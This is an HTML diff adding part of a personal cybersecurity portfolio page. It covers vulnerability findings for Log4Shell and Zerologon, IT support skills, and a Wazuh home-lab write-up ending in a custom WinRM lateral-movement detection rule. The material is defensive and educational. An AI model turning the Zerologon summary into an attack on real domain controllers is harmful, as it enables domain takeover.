+              <code class="text-cyber-green text-[11px] block overflow-x-auto">-Dlog4j2.formatMsgNoLookups=true</code>
+            </div>
+          </div>
+
+          <!-- Finding 2: Zerologon -->
+          <div class="bg-cyber-card p-6 rounded-xl border border-cyber-red/50 shadow-glow-red/10 relative overflow-hidden">
+            <div class="absolute top-0 right-0 bg-cyber-red text-black font-mono font-extrabold text-xs px-3 py-1 rounded-bl-lg">
+              CVSS 10.0 CRITICAL
+            </div>
+            <div class="text-cyber-red font-mono text-xs mb-1">CVE-2020-1472</div>
+            <h3 class="text-xl font-bold text-white mb-2">Zerologon Privilege Escalation</h3>
+            <p class="text-xs font-mono text-cyber-cyan mb-4">Target: Primary Domain Controller (PDC-01)</p>
+            <p class="text-slate-300 text-xs leading-relaxed mb-4">
+              Identified missing Netlogon cryptography validation allowing an unauthenticated attacker on the local network to reset the Domain Controller password and gain Active Directory domain admin rights.
+            </p>
+            <div class="bg-cyber-darker p-3 rounded-lg border border-cyber-border font-mono text-xs">
+              <div class="text-slate-400 text-[11px] mb-1">Risk Remediation Strategy:</div>
+              <div class="text-cyber-cyan text-[11px]">Enforce Netlogon Secure Channel Enforcement & Deploy KB4565349 Patch</div>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+    </section>
+
+    <!-- SECTION 5: 3-YEAR IT TECH FOUNDATION -->
+    <section id="it-tech" class="py-16 bg-cyber-darker/60 border-t border-cyber-border">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        
+        <div class="mb-10">
+          <div class="text-cyber-cyan font-mono text-xs uppercase tracking-widest mb-1">// HARDWARE & IT SYSTEMS</div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">3-Year IT Tech Foundation</h2>
+          <p class="text-slate-400 text-sm mt-1 font-mono">
+            Practical, battle-tested hardware troubleshooting, OS deployment, and system maintenance expertise.
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+          
+          <div class="bg-cyber-card p-6 rounded-xl border border-cyber-border hover:border-cyber-green transition-all">
+            <div class="w-10 h-10 rounded-lg bg-cyber-green/10 text-cyber-green flex items-center justify-center mb-4">
+              <i class="fa-solid fa-microchip text-lg"></i>
+            </div>
+            <h3 class="text-white font-bold text-base mb-2">Hardware Maintenance</h3>
+            <p class="text-slate-400 text-xs leading-relaxed">
+              Complete system unit assembly, deep component cleaning, thermal paste replacement, and airflow optimizations.
+            </p>
+          </div>
+
+          <div class="bg-cyber-card p-6 rounded-xl border border-cyber-border hover:border-cyber-cyan transition-all">
+            <div class="w-10 h-10 rounded-lg bg-cyber-cyan/10 text-cyber-cyan flex items-center justify-center mb-4">
+              <i class="fa-solid fa-compact-disc text-lg"></i>
+            </div>
+            <h3 class="text-white font-bold text-base mb-2">OS Multi-Boot Deploy</h3>
+            <p class="text-slate-400 text-xs leading-relaxed">
+              PC formatting, customized OS deployment (Windows 10/11 & Linux distros) utilizing Rufus multi-boot USB media.
+            </p>
+          </div>
+
+          <div class="bg-cyber-card p-6 rounded-xl border border-cyber-border hover:border-cyber-amber transition-all">
+            <div class="w-10 h-10 rounded-lg bg-cyber-amber/10 text-cyber-amber flex items-center justify-center mb-4">
+              <i class="fa-solid fa-database text-lg"></i>
+            </div>
+            <h3 class="text-white font-bold text-base mb-2">Disk Cloning & Recovery</h3>
+            <p class="text-slate-400 text-xs leading-relaxed">
+              HDD/SSD drive cloning, bad sector diagnostic mapping, partition repair, and emergency user data recovery.
+            </p>
+          </div>
+
+          <div class="bg-cyber-card p-6 rounded-xl border border-cyber-border hover:border-cyber-red transition-all">
+            <div class="w-10 h-10 rounded-lg bg-cyber-red/10 text-cyber-red flex items-center justify-center mb-4">
+              <i class="fa-solid fa-screwdriver-wrench text-lg"></i>
+            </div>
+            <h3 class="text-white font-bold text-base mb-2">Diagnostic Troubleshooting</h3>
+            <p class="text-slate-400 text-xs leading-relaxed">
+              BSOD crash dump analysis, NO-POST diagnosis, RAM channel testing, and PSU power ripple troubleshooting.
+            </p>
+          </div>
+
+        </div>
+
+      </div>
+    </section>
+
+    <!-- SECTION 6: WAZUH HOME LAB DEEP DIVE (FEATURED CASE STUDY) -->
+    <section id="wazuh-lab" class="py-20 border-t border-cyber-border bg-gradient-to-b from-cyber-black via-cyber-card/40 to-cyber-black">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        
+        <!-- Showcase Header -->
+        <div class="text-center max-w-3xl mx-auto mb-12">
+          <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyber-cyan/10 border border-cyber-cyan/30 text-cyber-cyan font-mono text-xs mb-3">
+            <i class="fa-solid fa-flask"></i> FEATURED SOC CASE STUDY
+          </div>
+          <h2 class="text-3xl sm:text-4xl font-extrabold text-white">
+            🛡️ Home Lab: Wazuh Manager + Windows Agent + Custom WinRM Detection
+          </h2>
+          <p class="text-slate-400 text-sm font-mono mt-3">
+            Built on personal laptop to master real-world SIEM troubleshooting, agent key enrollment, logchannel collection, and custom rule writing.
+          </p>
+        </div>
+
+        <!-- Highlight Quote Box -->
+        <div class="bg-cyber-darker border-l-4 border-cyber-green p-6 rounded-r-xl border-y border-r border-cyber-border mb-12 shadow-lg">
+          <p class="text-slate-200 text-sm md:text-base italic leading-relaxed">
+            "I built this at home using my personal laptop and VM. From <code class="text-cyber-red font-mono font-not-italic">No agents were added</code> and <code class="text-cyber-red font-mono font-not-italic">Offline API</code> errors to <code class="text-cyber-green font-mono font-not-italic">Active (1)</code> status and custom WinRM detection with 6 live alerts."
+          </p>
+        </div>
+
+        <!-- System Architecture Overview Badges -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
+          
+          <div class="bg-cyber-card p-5 rounded-xl border border-cyber-border flex items-center space-x-4">
+            <div class="w-12 h-12 rounded-lg bg-cyber-cyan/10 text-cyber-cyan flex items-center justify-center shrink-0">
+              <i class="fa-brands fa-ubuntu text-2xl"></i>
+            </div>
+            <div>
+              <div class="text-xs font-mono text-slate-400">WAZUH MANAGER</div>
+              <div class="font-bold text-white text-sm">Ubuntu VM (v4.14.9)</div>
+              <div class="font-mono text-xs text-cyber-cyan">IP: 192.168.100.91</div>
+            </div>
+          </div>
+
+          <div class="bg-cyber-card p-5 rounded-xl border border-cyber-border flex items-center space-x-4">
+            <div class="w-12 h-12 rounded-lg bg-cyber-green/10 text-cyber-green flex items-center justify-center shrink-0">
+              <i class="fa-brands fa-windows text-2xl"></i>
+            </div>
+            <div>
+              <div class="text-xs font-mono text-slate-400">WINDOWS AGENT (001)</div>
+              <div class="font-bold text-white text-sm">LAPTOP-REYCARDO</div>
+              <div class="font-mono text-xs text-cyber-green">IP: 192.168.100.77 (Active)</div>
+            </div>
+          </div>
+
+          <div class="bg-cyber-card p-5 rounded-xl border border-cyber-border flex items-center space-x-4">
+            <div class="w-12 h-12 rounded-lg bg-cyber-amber/10 text-cyber-amber flex items-center justify-center shrink-0">
+              <i class="fa-solid fa-chart-line text-2xl"></i>
+            </div>
+            <div>
+              <div class="text-xs font-mono text-slate-400">SIEM DASHBOARD</div>
+              <div class="font-bold text-white text-sm">Wazuh Web Console</div>
+              <div class="font-mono text-xs text-cyber-amber">URL: https://127.0.0.1</div>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- Interactive Phase Timeline / Accordion -->
+        <div class="space-y-4 mb-16">
+          <h3 class="text-xl font-bold text-white mb-6 flex items-center gap-2">
+            <i class="fa-solid fa-list-check text-cyber-green"></i> Step-by-Step Lab Execution Timeline (Phases 1 - 8)
+          </h3>
+
+          <!-- Phase 1 -->
+          <div class="bg-cyber-card rounded-xl border border-cyber-border overflow-hidden">
+            <button onclick="togglePhase('phase-1')" class="w-full px-6 py-4 flex items-center justify-between text-left hover:bg-cyber-darker transition-colors">
+              <div class="flex items-center space-x-3">
+                <span class="px-2.5 py-1 rounded bg-cyber-red/20 text-cyber-red font-mono text-xs font-bold">Phase 1</span>
+                <span class="font-bold text-white text-sm sm:text-base">First error - No agents were added + Offline API</span>
+              </div>
+              <i id="phase-1-icon" class="fa-solid fa-chevron-down text-slate-400 text-xs"></i>
+            </button>
+            <div id="phase-1" class="hidden px-6 pb-6 pt-2 border-t border-cyber-border/60 font-mono text-xs space-y-3">
+              <p class="text-slate-300">Initial dashboard load error: <code class="text-cyber-red">Agents (0) - No agents were added. Offline API</code>. Generated key on Manager VM:</p>
+              <div class="bg-cyber-darker p-3 rounded border border-cyber-border text-cyber-green overflow-x-auto">
+                cd /var/ossec/bin<br>
+                sudo ./manage_agents -a LAPTOP-REYCARDO<br>
+                sudo ./manage_agents -e 001
+              </div>
+              <p class="text-slate-400 text-[11px]">Key Generated: <code class="text-cyber-cyan">001 LAPTOP-REYCARDO any 2c209daee9c4163605fc...</code></p>
+            </div>
+          </div>
+
+          <!-- Phase 2 -->
+          <div class="bg-cyber-card rounded-xl border border-cyber-border overflow-hidden">
+            <button onclick="togglePhase('phase-2')" class="w-full px-6 py-4 flex items-center justify-between text-left hover:bg-cyber-darker transition-colors">
+              <div class="flex items-center space-x-3">
+                <span class="px-2.5 py-1 rounded bg-cyber-green/20 text-cyber-green font-mono text-xs font-bold">Phase 2</span>
+                <span class="font-bold text-white text-sm sm:text-base">Fixing Windows Key & IP Alignment → Active (1) Green</span>
+              </div>
+              <i id="phase-2-icon" class="fa-solid fa-chevron-down text-slate-400 text-xs"></i>
+            </button>
+            <div id="phase-2" class="hidden px-6 pb-6 pt-2 border-t border-cyber-border/60 font-mono text-xs space-y-3">
+              <p class="text-slate-300">Windows agent <code class="text-cyber-amber">client.keys</code> was 0 bytes! Pasted manager key, updated <code class="text-cyber-cyan">ossec.conf</code> IP from <code class="text-cyber-red">192.168.100.9</code> to <code class="text-cyber-green">192.168.100.91</code> and restarted service.</p>
+              <div class="bg-cyber-darker p-3 rounded border border-cyber-border text-cyber-green overflow-x-auto">
+                NET STOP WazuhSvc && NET START WazuhSvc<br>
+                Test-NetConnection 192.168.100.91 -Port 1514  # Output: True
+              </div>
+              <div class="p-3 bg-cyber-green/10 border border-cyber-green/30 rounded text-cyber-green text-[11px]">
+                ✔ Result: Agent LAPTOP-REYCARDO turned <strong>Active (1) Green</strong> in dashboard console.
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 3 -->
+          <div class="bg-cyber-card rounded-xl border border-cyber-border overflow-hidden">
+            <button onclick="togglePhase('phase-3')" class="w-full px-6 py-4 flex items-center justify-between text-left hover:bg-cyber-darker transition-colors">
+              <div class="flex items-center space-x-3">
+                <span class="px-2.5 py-1 rounded bg-cyber-cyan/20 text-cyber-cyan font-mono text-xs font-bold">Phase 3</span>
+                <span class="font-bold text-white text-sm sm:text-base">Understanding 431 SCA & CIS Benchmark Alerts</span>
+              </div>
+              <i id="phase-3-icon" class="fa-solid fa-chevron-down text-slate-400 text-xs"></i>
+            </button>
+            <div id="phase-3" class="hidden px-6 pb-6 pt-2 border-t border-cyber-border/60 font-mono text-xs space-y-3">
+              <p class="text-slate-300">Evaluated 431 Security Configuration Assessment (SCA) hits (Rule 19005 - CIS Score 27%). Confirmed these were system hardening audit recommendations rather than active malware.</p>
+            </div>
+          </div>
+
+          <!-- Phase 4 & 5 -->
+          <div class="bg-cyber-card rounded-xl border border-cyber-border overflow-hidden">
+            <button onclick="togglePhase('phase-4')" class="w-full px-6 py-4 flex items-center justify-between text-left hover:bg-cyber-darker transition-colors">
+              <div class="flex items-center space-x-3">
+                <span class="px-2.5 py-1 rounded bg-cyber-amber/20 text-cyber-amber font-mono text-xs font-bold">Phase 4 & 5</span>
+                <span class="font-bold text-white text-sm sm:text-base">WinRM Listener Config & Event Channel Integration</span>
+              </div>
+              <i id="phase-4-icon" class="fa-solid fa-chevron-down text-slate-400 text-xs"></i>
+            </button>
+            <div id="phase-4" class="hidden px-6 pb-6 pt-2 border-t border-cyber-border/60 font-mono text-xs space-y-3">
+              <p class="text-slate-300">Enabled WinRM (<code class="text-cyber-cyan">winrm quickconfig</code>) on port 5985 for MITRE T1021.006 monitoring. Configured Windows <code class="text-cyber-cyan">ossec.conf</code> to ingest event channel:</p>
+              <div class="bg-cyber-darker p-3 rounded border border-cyber-border text-cyber-cyan overflow-x-auto">
+&lt;localfile&gt;<br>
+&nbsp;&nbsp;&lt;location&gt;Microsoft-Windows-WinRM/Operational&lt;/location&gt;<br>
+&nbsp;&nbsp;&lt;log_format&gt;eventchannel&lt;/log_format&gt;<br>
+&lt;/localfile&gt;
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 6, 7 & 8 -->
+          <div class="bg-cyber-card rounded-xl border border-cyber-border overflow-hidden">
+            <button onclick="togglePhase('phase-6')" class="w-full px-6 py-4 flex items-center justify-between text-left hover:bg-cyber-darker transition-colors">
+              <div class="flex items-center space-x-3">
+                <span class="px-2.5 py-1 rounded bg-cyber-purple/20 text-cyber-purple font-mono text-xs font-bold">Phase 6 - 8</span>
+                <span class="font-bold text-white text-sm sm:text-base">Archives Log Fix & Custom Rule 100200 Level 7 Deployment</span>
+              </div>
+              <i id="phase-6-icon" class="fa-solid fa-chevron-down text-slate-400 text-xs"></i>
+            </button>
+            <div id="phase-6" class="hidden px-6 pb-6 pt-2 border-t border-cyber-border/60 font-mono text-xs space-y-3">
+              <p class="text-slate-300">Changed Manager <code class="text-cyber-cyan">&lt;logall&gt;no&lt;/logall&gt;</code> to <code class="text-cyber-green">yes</code> (archives.log grew from 0 to 299K). Wrote custom detection in <code class="text-cyber-cyan">local_rules.xml</code>:</p>
+              <div class="bg-cyber-darker p-3 rounded border border-cyber-border text-cyber-green overflow-x-auto">
+&lt;group name="winrm_custom,"&gt;<br>
+&nbsp;&nbsp;&lt;rule id="100200" level="7"&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&lt;if_sid&gt;60000&lt;/if_sid&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&lt;field name="win.system.providerName"&gt;Microsoft-Windows-WinRM&lt;/field&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;WinRM operation detected - Potential Lateral Movement&lt;/description&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&lt;mitre&gt;&lt;id&gt;T1021.006&lt;/id&gt;&lt;/mitre&gt;<br>
+&nbsp;&nbsp;&lt;/rule&gt;<br>
+&lt;/group&gt;
+              </div>
+              <div class="p-3 bg-cyber-card border border-cyber-green/40 rounded text-cyber-green">
+                🎉 Final Result: Dashboard logged <strong>6 Total WinRM Alerts</strong> tagged with MITRE T1021.006!
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- Key Takeaways & Status Badges -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+          
+          <!-- Key Takeaways Checklist -->
+          <div class="bg-cyber-card p-6 rounded-xl border border-cyber-border">
+            <h4 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
+              <i class="fa-solid fa-graduation-cap text-cyber-green"></i> SOC Lessons & Practical Takeaways
+            </h4>
+            <ul class="space-y-2.5 font-mono text-xs text-slate-300">
+              <li class="flex items-start gap-2">
+                <i class="fa-solid fa-check text-cyber-green mt-0.5"></i>
+                <span><strong>Architecture:</strong> Mastered Manager (1514 port), Windows Agent & Dashboard loop.</span>
+              </li>
+              <li class="flex items-start gap-2">
+                <i class="fa-solid fa-check text-cyber-green mt-0.5"></i>
+                <span><strong>Troubleshooting:</strong> Debugged 0-byte client keys & IP routing misconfigurations.</span>
+              </li>
+              <li class="flex items-start gap-2">
+                <i class="fa-solid fa-check text-cyber-green mt-0.5"></i>
+                <span><strong>Audit vs Alert:</strong> Differentiated SCA CIS compliance audits from active security alerts.</span>
+              </li>
+              <li class="flex items-start gap-2">
+                <i class="fa-solid fa-check text-cyber-green mt-0.5"></i>
+                <span><strong>Custom Rules:</strong> Engineered custom Level 7 alert rules mapped to MITRE ATT&CK.</span>
+              </li>
+            </ul>
+          </div>
+
+          <!-- Final Lab Status Banner -->
+          <div class="bg-cyber-darker p-6 rounded-xl border border-cyber-border flex flex-col justify-between">
+            <div>
+              <div class="text-xs font-mono text-cyber-green mb-1">// LAB VERIFICATION STATUS</div>
+              <h4 class="text-lg font-bold text-white mb-3">Operational Readiness Confirmed</h4>
+              <p class="text-xs text-slate-400 leading-relaxed mb-4">
+                Completed directly on personal environment to build core SOC analyst triage skills.
+              </p>
+            </div>
+            <div class="flex flex-wrap gap-2 font-mono text-[11px]">
+              <span class="px-2.5 py-1 rounded bg-cyber-green/20 text-cyber-green border border-cyber-green/40 font-bold">Active (1) Green</span>
+              <span class="px-2.5 py-1 rounded bg-cyber-cyan/20 text-cyber-cyan border border-cyber-cyan/40">Custom Rule 100200 Level 7</span>
+              <span class="px-2.5 py-1 rounded bg-cyber-amber/20 text-cyber-amber border border-cyber-amber/40">299K Log Archives</span>
+              <span class="px-2.5 py-1 rounded bg-cyber-purple/20 text-cyber-purple border border-cyber-purple/40">MITRE T1021.006</span>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+    </section>
+
+    <!-- FOOTER / CONTACT SECTION -->
+    <footer id="contact" class="py-12 bg-cyber-darker border-t border-cyber-border mt-auto">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex flex-col md:flex-row items-center justify-between gap-6">
+          
+          <div>
+            <div class="font-mono font-bold text-white text-lg">
+              Millan, Reycardo Montañez <span class="text-cyber-green">| Cybersecurity Portfolio</span>
+            </div>
+            <p class="text-xs text-slate-400 font-mono mt-1">
+              Continuously learning, expanding skills & contributing to cyber defense.
+            </p>
+          </div>
+
+          <div class="flex items-center space-x-4">
+            <a href="https://reymillanworks-oss.github.io/Reymillanworks101/" target="_blank" rel="noopener noreferrer" 
+               class="p-2.5 rounded-lg bg-cyber-card border border-cyber-border text-slate-300 hover:text-cyber-green hover:border-cyber-green transition-all">
+              <i class="fa-brands fa-github text-lg"></i>
+            </a>
+            <a href="mailto:contact@reymillan.com" 
+               class="px-4 py-2 rounded-lg bg-cyber-green text-black font-mono text-xs font-bold hover:bg-emerald-400 transition-all">
+              <i class="fa-solid fa-envelope mr-1.5"></i> Get in Touch
+            </a>
+          </div>
+
+        </div>
+
+        <div class="mt-8 pt-6 border-t border-cyber-border/60 text-center font-mono text-xs text-slate-500">
+          © 2026 Millan, Reycardo Montañez • Single Interactive Cyber Portfolio • Built with Canvas & Tailwind
+        </div>
+      </div>
+    </footer>
+
+  </div>
+
+  <!-- JAVASCRIPT LOGIC -->
+  <script>
+    // --- 1. Interactive Matrix / Binary Rain Canvas Background ---
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+
+    let width = canvas.width = window.innerWidth;
+    let height = canvas.height = window.innerHeight;
+
+    window.addEventListener('resize', () => {
+      width = canvas.width = window.innerWidth;
+      height = canvas.height = window.innerHeight;
+      initMatrix();
+    });
+
+    const characters = '0101010101010101ABCDEFSEC';
+    const fontSize = 14;
+    let columns = Math.floor(width / fontSize);
+    let drops = [];
+
+    function initMatrix() {
+      columns = Math.floor(width / fontSize);
+      drops = [];
+      for (let i = 0; i < columns; i++) {
+        drops[i] = Math.random() * -100;
+      }
+    }
+    initMatrix();
+
+    let mouseX = 0;
+    let mouseY = 0;
+    window.addEventListener('mousemove', (e) => {
+      mouseX = e.clientX;
+      mouseY = e.clientY;
+    });
+
+    function drawMatrix() {
+      ctx.fillStyle = 'rgba(7, 8, 12, 0.1)';
+      ctx.fillRect(0, 0, width, height);
+
+      ctx.font = fontSize + 'px "JetBrains Mono", monospace';
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = characters.charAt(Math.floor(Math.random() * characters.length));
+        
+        // Interactive proximity highlighting
+        const dropX = i * fontSize;
+        const dropY = drops[i] * fontSize;
+        const dist = Math.hypot(dropX - mouseX, dropY - mouseY);
+
+        if (dist < 100) {
+          ctx.fillStyle = '#00f3ff'; // Matrix Cyan on cursor hover
+        } else if (Math.random() > 0.95) {
+          ctx.fillStyle = '#ffffff'; // White flash
+        } else {
+          ctx.fillStyle = '#00ff66'; // Standard Cyber Green
+        }
+
+        ctx.fillText(text, dropX, dropY);
+
+        if (dropY > height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
+      }
+    }
+    setInterval(drawMatrix, 33);
+
+    // --- 2. Typewriter Effect ---
+    const roles = [
+      "Cyber Threat Monitoring L1 Graduate",
+      "Aspiring Cybersecurity Analyst",
+      "Fortinet Certified Operator",
+      "Continuous Learner & Contributor"
+    ];
+    let roleIndex = 0;
+    let charIndex = 0;
+    let isDeleting = false;
+    const typewriterElement = document.getElementById('typewriter');
+
+    function typeEffect() {
+      const currentRole = roles[roleIndex];
+      
+      if (isDeleting) {
+        typewriterElement.textContent = currentRole.substring(0, charIndex - 1);
+        charIndex--;
+      } else {
+        typewriterElement.textContent = currentRole.substring(0, charIndex + 1);
+        charIndex++;
+      }
+
+      let speed = isDeleting ? 40 : 80;
+
+      if (!isDeleting && charIndex === currentRole.length) {
+        speed = 2000;
+        isDeleting = true;
+      } else if (isDeleting && charIndex === 0) {
+        isDeleting = false;
+        roleIndex = (roleIndex + 1) % roles.length;
+        speed = 500;
+      }
+
+      setTimeout(typeEffect, speed);
+    }
+    document.addEventListener('DOMContentLoaded', typeEffect);
+
+    // --- 3. Mobile Menu Toggle ---
+    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+    const mobileMenu = document.getElementById('mobileMenu');
+    mobileMenuBtn.addEventListener('click', () => {
+      mobileMenu.classList.toggle('hidden');
+    });
+
+    // --- 4. Interactive Accordion Toggles for Wazuh Lab ---
+    function togglePhase(phaseId) {
+      const content = document.getElementById(phaseId);
+      const icon = document.getElementById(phaseId + '-icon');
+      
+      if (content.classList.contains('hidden')) {
+        content.classList.remove('hidden');
+        icon.classList.remove('fa-chevron-down');
+        icon.classList.add('fa-chevron-up');
+      } else {
+        content.classList.add('hidden');
+        icon.classList.remove('fa-chevron-up');
+        icon.classList.add('fa-chevron-down');
+      }
+    }
+
+    // --- 5. Code Copying Utility ---
+    function copyToClipboard(elementId) {
+      const codeElement = document.getElementById(elementId);
+      const textToCopy = codeElement.innerText;
+      
+      // Fallback standard copy for web frame safety
+      const textArea = document.createElement("textarea");
+      textArea.value = textToCopy;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textArea);
+
+      const copyLabel = document.getElementById('copy-text');
+      copyLabel.textContent = 'Copied!';
+      setTimeout(() => {
+        copyLabel.textContent = 'Copy Code';
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
